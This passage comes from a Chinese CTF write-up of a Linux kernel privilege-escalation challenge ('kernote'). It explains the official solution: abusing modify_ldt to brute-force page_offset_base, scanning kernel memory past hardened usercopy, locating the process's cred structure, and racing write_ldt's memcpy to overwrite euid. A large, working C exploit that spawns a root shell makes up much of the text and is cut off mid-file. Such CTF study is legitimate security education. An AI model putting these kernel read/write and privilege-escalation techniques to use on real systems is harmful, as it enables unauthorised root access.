提权（官方解法）</h3><p>这个解法是官方给出的解法，利用 modify_ldt 系统调用完成对内核空间的遍历与修改</p><h4 id="Step-I-泄露-page-offset-base"><a href="#Step-I-泄露-page-offset-base" class="headerlink" title="Step I. 泄露 page_offset_base"></a>Step I. 泄露 page_offset_base</h4><p>由于开启了 kaslr 的缘故，我们需要想方法泄露内核空间相关地址，在这里官方题解给出了一种美妙的解法——我们可以<strong>直接爆破内核地址</strong>：对于无效的地址，copy_to_user 会返回非 0 值，此时 read_ldt() 的返回值便是 <code>-EFAULT</code>，当 read_ldt() 执行成功时，说明我们命中了内核空间</p><p>爆破代码逻辑很容易就能写出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">size_t</span>                 kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span>                temp;</span><br><span class="line"><span class="type">int</span>                 retval;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">chunkSet(<span class="number">0</span>);</span><br><span class="line">chunkDel(<span class="number">0</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(kernel_base);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    kernel_base += <span class="number">0x200000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是本题开启了 <code>hardened usercopy</code> 保护，当 copy_to_user() 的源地址为内核 .text 段（_stext, _etext）时<strong>会引起 kernel panic</strong></p><p>那么这里我们可以考虑更改思路——搜索<code>物理地址直接映射区</code>，<strong>我们的 task_struct 结构体便在这一块区域内</strong>，只要我们找到本进程的 task_struct，更改 cred 的 uid 为 0，也能够完成提权</p><blockquote><p>物理地址直接映射区即 direct mapping area，即<strong>线性映射区</strong>（不是线代那个线性映射），这块区域的线性地址到物理地址空间的映射是<strong>连续的</strong>，kmalloc 便从此处分配内存</p><p>而 vmalloc 则从 vmalloc&#x2F;ioremap space 分配内存，起始地址为 <code>vmalloc_base</code>，这一块区域到物理地址间的映射是<strong>不连续的</strong></p></blockquote><p>这一块区域的起始地址称之为 <code>page_offset_base</code>，其地址为 <code>0xffff888000000000</code>（参见 <a href="https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst">这↑里↓</a>），我们从这个地址开始搜索即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">int</span>                 retval;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">chunkSet(<span class="number">0</span>);</span><br><span class="line">chunkDel(<span class="number">0</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(page_offset_base);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x2000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Step-II-泄露进程-task-struct-地址"><a href="#Step-II-泄露进程-task-struct-地址" class="headerlink" title="Step II. 泄露进程 task_struct 地址"></a>Step II. 泄露进程 task_struct 地址</h4><p>阅读 <code>task_struct</code> 源码，观察到其主体凭证下方有个特殊的字段 <code>comm</code>：</p><blockquote><p>&#x2F;include&#x2F;linux&#x2F;sched.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>            *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>        *<span class="title">nameidata</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个字段便是该进程的名字，且其位置刚好在 cred 附近，我们只需要从 <code>page_offset_base</code> 开始找当前进程的名字便能够找到当前进程的 task_struct</p><p>使用 prctl 系统调用我们可以修改当前进程的 task_struct 的 comm 字段，这样我们便能够更方便地进行查找：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwn!&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是我们不能够直接搜索整个线性映射区域，这仍有可能触发 hardened usercopy 的检查，在这里官方给出了一个美妙的解法：</p><p>观察 fork 系统调用的源码，我们可以发现如下执行链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure><p>ldt_dup_context() 定义于 <code>arch/x86/kernel/ldt.c</code> 中，注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里会通过 memcpy 将父进程的 ldt-&gt;entries 拷贝给子进程，<strong>是完全处在内核中的操作</strong>，因此不会触发 hardened usercopy 的检查，我们只需要在父进程中设定好搜索的地址之后再开子进程来用 read_ldt() 读取数据即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cur_pid = getpid();</span><br><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">buf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">search_addr = page_offset_base;</span><br><span class="line">cred_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(search_addr);</span><br><span class="line">    <span class="type">int</span> ret = fork();</span><br><span class="line">    <span class="keyword">if</span> (!ret)    <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        signal(SIGSEGV, die);</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        result_addr = (<span class="type">size_t</span>*) memmem(buf, <span class="number">0x8000</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> (result_addr \</span><br><span class="line">            &amp;&amp; (result_addr[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">            &amp;&amp; (result_addr[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">            &amp;&amp; (((<span class="type">int</span>) result_addr[<span class="number">-58</span>]) == cur_pid))</span><br><span class="line">        &#123;</span><br><span class="line">            cred_addr = result_addr[<span class="number">-2</span>]; <span class="comment">// task_struct-&gt;cred</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found cred: \033[0m%lx\n&quot;</span>, cred_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (cred_addr)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    search_addr += <span class="number">0x8000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里需要注意一点就是 uid 的类型为 int，笔者因为这个疏忽卡了好一阵子…</p></blockquote><h4 id="Step-III-double-fetch-更改进程-uid-完成提权"><a href="#Step-III-double-fetch-更改进程-uid-完成提权" class="headerlink" title="Step III. double fetch 更改进程 uid 完成提权"></a>Step III. double fetch 更改进程 uid 完成提权</h4><p>在我们获得了 cred 的地址之后，我们只需要将 cred-&gt;euid 更改为 0 就能拥有 root 权限，之后再调用 <code> setreuid ()</code> 等一系列函数完成全面的提权</p><p>现在我们考虑如何在内核空间中进行任意写，这一次我们仍然借助 modify_ldt() 系统调用来达到我们的目的，重新回到 <code>write_ldt()</code> 函数的主体逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到的是，在 memcpy 时所拷贝的字节数为 <code>old_ldt-&gt;nr_entries * LDT_ENTRY_SIZE</code>，其中前者的上限值与后者都定义于 <code>arch/x86/include/uapi/asm/ldt.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES    8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE    8</span></span><br></pre></td></tr></table></figure><p>那么这个数据量相对较大，拷贝需要用到一定的时间，而在拷贝结束后有一句 <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt</code>，其中 ldt 为我们传入的数据，我们不难想到的是<strong>可以通过条件竞争的方式在 memcpy 过程中将 new_ldt-&gt;entries 更改为我们的目标地址从而完成任意地址写</strong>，即 double fetch</p><p>在这里为了提高利用的成功率，笔者参照官方题解中使用 <code>sched_setaffinity</code> 将相应的进程绑定到单个 CPU 上（在 run.sh 中定义了两个核），需要注意的是编译时需包含 <code>#define _GNU_SOURCE</code></p><p>在这里<strong>有几个令笔者所不解的点</strong>，目前暂时还没联系上出题人（<del>都过去一个月了谁还看discord啊</del>）：</p><ul><li>在开子进程任意写之前要先将当前的 <code>old_ldt-&gt;entries</code> 设为 <code>cred_addr + 4</code>，不然成功率会大幅下降</li><li>任意写时需先分配 index 为 1~ 15 的 object，并全部释放，选取其中的 <code>index 11</code> 来进行任意写，其他的 index 都会失败，仅分配一个 object 也会失败</li></ul><h4 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h4><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> kernote_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] %s \033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkSet</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6666</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkAdd</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6667</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkDel</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6668</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkEdit</span><span class="params">(<span class="type">size_t</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6669</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkFuck</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x666A</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line">    <span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="type">size_t</span>              temp;</span><br><span class="line">    <span class="type">int</span>                 retval;</span><br><span class="line">    <span class="type">size_t</span>                cred_addr;</span><br><span class="line">    <span class="type">size_t</span>                search_addr;</span><br><span class="line">    <span class="type">size_t</span>              per_search_addr;</span><br><span class="line">    <span class="type">size_t</span>              *result_addr;</span><br><span class="line">    <span class="type">int</span>                   cur_pid;</span><br><span class="line">    <span class="type">char</span>                *buf;</span><br><span class="line">    <span class="type">int</span>                 pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">cpu_set_t</span>           cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit... \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    kernote_fd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    chunkAdd(<span class="number">0</span>);</span><br><span class="line">    chunkSet(<span class="number">0</span>);</span><br><span class="line">    chunkDel(<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;\033[34m\033[1m[*] now checking: \033[0m%lx\n&quot;, page_offset_base);</span></span><br><span class="line">        chunkEdit(page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">        <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        page_offset_base += <span 